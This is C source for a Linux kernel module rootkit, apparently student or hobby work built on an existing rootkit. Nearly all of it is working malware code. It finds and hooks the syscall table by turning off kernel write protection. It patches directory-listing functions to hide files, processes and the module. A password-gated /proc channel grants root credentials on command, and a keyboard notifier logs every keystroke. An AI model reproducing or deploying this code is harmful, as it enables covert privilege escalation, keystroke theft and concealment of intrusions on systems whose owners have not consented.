/*
 * Copyright (C) 2016-2017 Maxim Biro <nurupo.contributions@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/version.h>
#include <linux/namei.h>

//keylogger includes
#include <linux/keyboard.h>
#include <linux/reboot.h>
#include <linux/input.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

// Copy-pasted from Linux sources as it's not provided in public headers
// of newer Linux.
// Might differ from one version of Linux kernel to another, so update as
// necessary
// http://lxr.free-electrons.com/source/fs/proc/internal.h?v=4.4#L31
struct proc_dir_entry
{
    unsigned int low_ino;
    umode_t mode;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    const struct inode_operations *proc_iops;
    const struct file_operations *proc_fops;
    struct proc_dir_entry *parent;
    struct rb_root subdir;
    struct rb_node subdir_node;
    void *data;
    atomic_t count;  /* use count */
    atomic_t in_use; /* number of callers into module in progress; */
                     /* negative -> it's going away RSN */
    struct completion *pde_unload_completion;
    struct list_head pde_openers; /* who did ->open, but not ->release */
    spinlock_t pde_unload_lock;   /* proc_fops checks and pde_users bumps */
    u8 namelen;
    char name[];
};

#endif

#include "config.h"

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Maxim Biro <nurupo.contributions@gmail.com>");

#define ARCH_ERROR_MESSAGE "Only i386 and x86_64 architectures are supported! " \
                           "It should be easy to port to new architectures though"

#define DISABLE_W_PROTECTED_MEMORY          \
    do                                      \
    {                                       \
        preempt_disable();                  \
        write_cr0(read_cr0() & (~0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY        \
    do                                   \
    {                                    \
        preempt_enable();                \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

// ========== SYS_CALL_TABLE ==========

#if defined __i386__
#define START_ADDRESS 0xc0000000
#define END_ADDRESS 0xd0000000
#elif defined __x86_64__
#define START_ADDRESS 0xffffffff81000000
#define END_ADDRESS 0xffffffffa2000000
#else
#error ARCH_ERROR_MESSAGE
#endif

//header for system call table
void **sys_call_table;

//header of execute command
int execute_command(const char __user *str, size_t length);

//////////////////////////////////////////////////////////////////////////////////////keylogger////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//@RESOURCES https://github.com/Fedeorlandau/simple-keylogger-lkm
//mapping for keyboard keys
const char CH_TABLE[] = {
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '?',
    '?', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '?',
    'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '?', 'X',
    'X', '?', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', 'z'};

/*event function print every key storke for chars presented in the table*/
static int on_key_event(struct notifier_block *nblock, unsigned long code, void *param0)
{
    struct keyboard_notifier_param *param = param0;
    if (code == KBD_KEYCODE && param->down)
    {
        int char_index = param->value - KEY_1;
        if (char_index >= 0 && char_index < sizeof(CH_TABLE))
        {
            printk(KERN_INFO "Key %c \n", CH_TABLE[char_index]);
        }
    }
    return NOTIFY_OK;
}

struct notifier_block nb = {
    .notifier_call = on_key_event
};

//////////////////////////////////////////////////////////////////////////////////////end////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////end keylogger////////////////////////////////////////////////////////////

/**
 * Finds a system call table based on a heruistic.
 * Note that the heruistic is not ideal, so it might find a memory region that
 * looks like a system call table but is not actually a system call table, but
 * it seems to work all the time on my systems.
 *
 * @return system call table on success, NULL on failure.
 */
void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void *)START_ADDRESS;

    while (i < END_ADDRESS)
    {
        sctable = (void **)i;

        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *)sys_close)
        {
            size_t j;
            // we expect there to be at least 300 system calls
            const unsigned int SYS_CALL_NUM = 300;
            // sanity check: no function pointer in the system call table should be NULL
            for (j = 0; j < SYS_CALL_NUM; j++)
            {
                if (sctable[j] == NULL)
                {
                    // this is not a system call table
                    goto skip;
                }
            }
            return sctable;
        }
    skip:;
        i += sizeof(void *);
    }

    return NULL;
}

// ========== END SYS_CALL_TABLE ==========

// ========== HOOK LIST ==========

struct hook
{
    void *original_function;
    void *modified_function;
    void **modified_at_address;
    struct list_head list;
};

LIST_HEAD(hook_list);

/**
 * Replaces a function pointer at some address with a new function pointer,
 * keeping record of the original function pointer so that it could be
 * restored later.
 *
 * @param modified_at_address Pointer to the address of where the function
 * pointer that we want to replace is stored. The same address would be used
 * when restoring the original funcion pointer back, so make sure it doesn't
 * become invalid by the time you try to restore it back.
 *
 * @param modified_function Function pointer that we want to replace the
 * original function pointer with.
 *
 * @return true on success, false on failure.
 */
int hook_create(void **modified_at_address, void *modified_function)
{
    struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);

    if (!h)
    {
        return 0;
    }

    h->modified_at_address = modified_at_address;
    h->modified_function = modified_function;
    list_add(&h->list, &hook_list);

    DISABLE_W_PROTECTED_MEMORY
    h->original_function = xchg(modified_at_address, modified_function);
    ENABLE_W_PROTECTED_MEMORY

    return 1;
}

/**
 * Get original function pointer based on the one we overwrote it with.
 * Useful when wanting to call the original function inside a hook.
 *
 * @param modified_function The function that overwrote the original one.
 * @return original function pointer on success, NULL on failure.
 */
void *hook_get_original(void *modified_function)
{
    void *original_function = NULL;
    struct hook *h;

    list_for_each_entry(h, &hook_list, list)
    {
        if (h->modified_function == modified_function)
        {
            original_function = h->original_function;
            break;
        }
    }
    return original_function;
}

/**
 * Removes all hook records, restores the overwritten function pointer to its
 * original value.
 */
void hook_remove_all(void)
{
    struct hook *h, *tmp;

    // make it so that instead of `modified_function` the `original_function`
    // would get called again
    list_for_each_entry(h, &hook_list, list)
    {
        DISABLE_W_PROTECTED_MEMORY
        *h->modified_at_address = h->original_function;
        ENABLE_W_PROTECTED_MEMORY
    }
    // a hack to let the changes made by the loop above propagate
    // as some process might be in the middle of our `modified_function`
    // and call `hook_get_original()`, which would return NULL if we
    // `list_del()` everything
    // so we make it so that instead of `modified_function` the
    // `original_function` would get called again, then sleep to wait until
    // existing `modified_function` calls finish and only them remove elements
    // fro mthe list
    msleep(10);
    list_for_each_entry_safe(h, tmp, &hook_list, list)
    {
        list_del(&h->list);
        kfree(h);
    }
}

// ========== END HOOK LIST ==========


asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
{

    asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
    original_read = hook_get_original(read);
    return original_read(fd, buf, count);
}


asmlinkage long write(unsigned int fd, const char __user *buf, size_t count)
{

    asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
    original_write = hook_get_original(write);
    return original_write(fd, buf, count);
}

// ========== ASM HOOK LIST ==========

#if defined __i386__
// push 0x00000000, ret
#define ASM_HOOK_CODE "\x68\x00\x00\x00\x00\xc3"
#define ASM_HOOK_CODE_OFFSET 1
// alternativly we could do `mov eax 0x00000000, jmp eax`, but it's a byte longer
//#define ASM_HOOK_CODE "\xb8\x00\x00\x00\x00\xff\xe0"
#elif defined __x86_64__
// there is no push that pushes a 64-bit immidiate in x86_64,
// so we do things a bit differently:
// mov rax 0x0000000000000000, jmp rax
#define ASM_HOOK_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
#define ASM_HOOK_CODE_OFFSET 2
#else
#error ARCH_ERROR_MESSAGE
#endif

struct asm_hook
{
    void *original_function;
    void *modified_function;
    char original_asm[sizeof(ASM_HOOK_CODE) - 1];
    struct list_head list;
};

LIST_HEAD(asm_hook_list);

/**
 * Patches machine code of the original function to call another function.
 * This function should not be called directly.
 */
void _asm_hook_patch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, ASM_HOOK_CODE, sizeof(ASM_HOOK_CODE) - 1);
    *(void **)&((char *)h->original_function)[ASM_HOOK_CODE_OFFSET] = h->modified_function;
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Patches machine code of a function so that it would call our function.
 * Keeps record of the original function and its machine code so that it could
 * be unpatched and patched again later.
 *
 * @param original_function Function to patch
 *
 * @param modified_function Function that should be called
 *
 * @return true on success, false on failure.
 */
int asm_hook_create(void *original_function, void *modified_function)
{
    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);

    if (!h)
    {
        return 0;
    }

    h->original_function = original_function;
    h->modified_function = modified_function;
    memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE) - 1);
    list_add(&h->list, &asm_hook_list);

    _asm_hook_patch(h);

    return 1;
}

/**
 * Patches the original function to call the modified function again.
 *
 * @param modified_function Function that the original function was patched to
 * call in asm_hook_create().
 */
void asm_hook_patch(void *modified_function)
{
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list)
    {
        if (h->modified_function == modified_function)
        {
            _asm_hook_patch(h);
            break;
        }
    }
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 * This function should not be called directly.
 */
void _asm_hook_unpatch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, h->original_asm, sizeof(ASM_HOOK_CODE) - 1);
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 *
 * @param modified_function Function that the original function was patched to
 * call in asm_hook_create().
 */
void *asm_hook_unpatch(void *modified_function)
{
    void *original_function = NULL;
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list)
    {
        if (h->modified_function == modified_function)
        {
            _asm_hook_unpatch(h);
            original_function = h->original_function;
            break;
        }
    }

    return original_function;
}

/**
 * Removes all hook records, unpatches all functions.
 */
void asm_hook_remove_all(void)
{
    struct asm_hook *h, *tmp;

    list_for_each_entry_safe(h, tmp, &asm_hook_list, list)
    {
        _asm_hook_unpatch(h);
        list_del(&h->list);
        kfree(h);
    }
}

// ========== END ASM HOOK LIST ==========


asmlinkage long asm_rmdir(const char __user *pathname)
{

    asmlinkage long (*original_rmdir)(const char __user *);
    original_rmdir = asm_hook_unpatch(asm_rmdir);
    long ret = original_rmdir(pathname);
    asm_hook_patch(asm_rmdir);

    return ret;
}

// ========== PID LIST ==========

struct pid_entry
{
    unsigned long pid;
    struct list_head list;
};

LIST_HEAD(pid_list);

int pid_add(const char *pid)
{
    struct pid_entry *p = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);

    if (!p)
    {
        return 0;
    }
    //string to long
    p->pid = simple_strtoul(pid, NULL, 10);

    list_add(&p->list, &pid_list);

    return 1;
}

// ========== END PID LIST ==========

// ========== FILE LIST ==========

struct file_entry
{
    char *name;
    struct list_head list;
};

LIST_HEAD(file_list);

// struct list_head *module_list;
// int is_hidden = 0;

// void hide(void)
// {
//     if (is_hidden) {
//         return;
//     }

//     module_list = THIS_MODULE->list.prev;

//     list_del(&THIS_MODULE->list);

//     is_hidden = 1;
// }

// ========== END PROTECT ==========

// ========== READDIR ==========

struct file_operations *get_fop(const char *path)
{
    struct file *file;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL)
    {
        return NULL;
    }

    struct file_operations *ret = (struct file_operations *)file->f_op;
    filp_close(file, 0);

    return ret;
}

// Macros to help reduce repeated code where only names differ.
// Decreses risk of "copy-paste & forgot to rename" error.
#define FILLDIR_START(NAME)                                                                                              \
    filldir_t original_##NAME##_filldir;                                                                                 \
                                                                                                                         \
    static int NAME##_filldir(void *context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
    {

#define FILLDIR_END(NAME)                                                          \
    return original_##NAME##_filldir(context, name, namelen, offset, ino, d_type); \
    }

#define READDIR(NAME)                                                  \
    int NAME##_iterate(struct file *file, struct dir_context *context) \
    {                                                                  \
        original_##NAME##_filldir = context->actor;                    \
        *((filldir_t *)&context->actor) = NAME##_filldir;              \
                                                                       \
        int (*original_iterate)(struct file *, struct dir_context *);  \
        original_iterate = asm_hook_unpatch(NAME##_iterate);           \
        int ret = original_iterate(file, context);                     \
        asm_hook_patch(NAME##_iterate);                                \
                                                                       \
        return ret;                                                    \
    }

// Macros to actually use
#define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
#define READDIR_HOOK_END(NAME) \
    FILLDIR_END(NAME)          \
    READDIR(NAME)

READDIR_HOOK_START(root)
struct file_entry *f;

list_for_each_entry(f, &file_list, list)
{
    if (strcmp(name, f->name) == 0)
    {
        return 0;
    }
}
READDIR_HOOK_END(root)

READDIR_HOOK_START(proc)
struct pid_entry *p;

list_for_each_entry(p, &pid_list, list)
{
    if (simple_strtoul(name, NULL, 10) == p->pid)
    {
        return 0;
    }
}
READDIR_HOOK_END(proc)

READDIR_HOOK_START(sys)
if (strcmp(name, KBUILD_MODNAME) == 0)
{
    return 0;
}
READDIR_HOOK_END(sys)

#undef FILLDIR_START
#undef FILLDIR_END
#undef READDIR

#undef READDIR_HOOK_START
#undef READDIR_HOOK_END

// ========== END READDIR ==========

static char *proc_to_hide = "7821";
static struct file_operations proc_fops;
static struct file_operations *backup_proc_fops;
static struct inode *proc_inode;
static struct path p;

struct dir_context *backup_ctx;

static int filldir_modified(struct dir_context *ctx, const char *proc_name, int len,
                            loff_t off, u64 ino, unsigned int d_type)
{
    //do not call it
    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
        return 0;

    //call original function
    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
}

struct dir_context rk_ctx = {
    .actor = filldir_modified,
};

/* replace original iterate in linx*/
int iterate_modified(struct file *file, struct dir_context *ctx)
{
    int result = 0;
    rk_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_proc_fops->iterate(file, &rk_ctx);
    ctx->pos = rk_ctx.pos;

    return result;
}

// ========== COMM CHANNEL ==========

static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
{
    if (execute_command(buf_user, count))
    {
        return count;
    }

    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
    original_write = asm_hook_unpatch(proc_fops_write);
    ssize_t ret = original_write(file, buf_user, count, p);
    asm_hook_patch(proc_fops_write);

    return ret;
}

static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t count, loff_t *p)
{
    execute_command(buf_user, count);

    int (*original_read)(struct file *, char __user *, size_t, loff_t *);
    original_read = asm_hook_unpatch(proc_fops_read);
    ssize_t ret = original_read(file, buf_user, count, p);
    asm_hook_patch(proc_fops_read);

    return ret;
}

int execute_command(const char __user *str, size_t length)
{
    if (length <= sizeof(CFG_PASS) ||
        strncmp(str, CFG_PASS, sizeof(CFG_PASS)) != 0)
    {
        return 0;
    }

    pr_info("Password check passed\n");

    // since the password matched, we assume the command following the password
    // is in the valid format

    str += sizeof(CFG_PASS);

    if (strcmp(str, CFG_ROOT) == 0)
    {
        pr_info("Got root command\n");
        struct cred *creds = prepare_creds();
        creds->uid.val = creds->euid.val = 0;
        creds->gid.val = creds->egid.val = 0;
        commit_creds(creds);
    }
    else if (strcmp(str, CFG_HIDE_PID) == 0)
    {
        pr_info("Got hide pid command\n");
        str += sizeof(CFG_HIDE_PID);
        proc_to_hide = str;
        pr_info("Got hide pid command \n");
        // int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
        // original_write = asm_hook_unpatch(proc_fops_write);
        // ssize_t ret = original_write(file, buf_user, count, p);
        //str now points to the id of the process
        // if (kern_path("/proc", 0, &p))
        //     return 0;

        // /* get the inode*/
        // proc_inode = p.dentry->d_inode;

        // /* get a copy of file_operations from inode */
        // proc_fops = *proc_inode->i_fop;
        // /* backup the file_operations */
        // backup_proc_fops = proc_inode->i_fop;
        // /* modify the copy with out evil function */
        // proc_fops.iterate = iterate_modified;
        // /* overwrite the active file_operations */
        // proc_inode->i_fop = &proc_fops;

        // undo changes
        // proc_inode = p.dentry->d_inode;
        // proc_inode->i_fop = backup_proc_fops;

        //  asm_hook_patch(proc_fops_write);
        pid_add(str);
        return 0;
    }
    else
    {
        pr_info("Got unknown command\n");
    }

    return 1;
}
int setup_proc_comm_channel(void)
{
    static const struct file_operations proc_file_fops = {0};
    struct proc_dir_entry *proc_entry = proc_create("temporary", 0444, NULL, &proc_file_fops);
    proc_entry = proc_entry->parent;

    if (strcmp(proc_entry->name, "/proc") != 0)
    {
        pr_info("Couldn't find \"/proc\" entry\n");
        remove_proc_entry("temporary", NULL);
        return 0;
    }

    remove_proc_entry("temporary", NULL);

    struct file_operations *proc_fops = NULL;

    struct rb_node *entry = rb_first(&proc_entry->subdir);

    while (entry)
    {
        pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);

        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0)
        {
            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
            proc_fops = (struct file_operations *)rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
            goto found;
        }

        entry = rb_next(entry);
    }

    pr_info("Couldn't find \"/proc/%s\"\n", CFG_PROC_FILE);

    return 0;

found:;

    if (proc_fops->write)
    {
        asm_hook_create(proc_fops->write, proc_fops_write);
    }

    if (proc_fops->read)
    {
        asm_hook_create(proc_fops->read, proc_fops_read);
    }

    if (!proc_fops->read && !proc_fops->write)
    {
        pr_info("\"/proc/%s\" has no write nor read function set\n", CFG_PROC_FILE);
        return 0;
    }

    return 1;
}

// ========== END COMM CHANNEL ==========

int init(void)
{
    pr_info("Module loaded\n");

    /*invisble kernel module*/
    // list_del_init(&__this_module.list);
    // kobject_del(&THIS_MODULE->mkobj.kobj);
    // printk("invisible: module loaded\n");
    /*end invisible lsmod kernel*/
    /*keylogger listener setup*/
     register_keyboard_notifier(&nb);



    if (!setup_proc_comm_channel())
    {
        pr_info("Failed to set up comm channel\n");
        return -1;
    }

    pr_info("Comm channel is set up\n");

    asm_hook_create(get_fop("/")->iterate, root_iterate);
    asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
    asm_hook_create(get_fop("/sys")->iterate, sys_iterate);

    sys_call_table = find_syscall_table();
    pr_info("Found sys_call_table at %p\n", sys_call_table);

    asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);

    hook_create(&sys_call_table[__NR_read], read);
    hook_create(&sys_call_table[__NR_write], write);

    return 0;
}

void exit(void)
{
    /*un register keylogger*/

    //  if(kern_path("/proc", 0, &p))
    //     return;
    // proc_inode = p.dentry->d_inode;
    // proc_inode->i_fop = backup_proc_fops;
    hook_remove_all();
    asm_hook_remove_all();
    
    unregister_keyboard_notifier(&nb);
    THIS_MODULE->name[0] = 0;

    pr_info("Module removed\n");
}

module_init(init);
module_exit(exit);
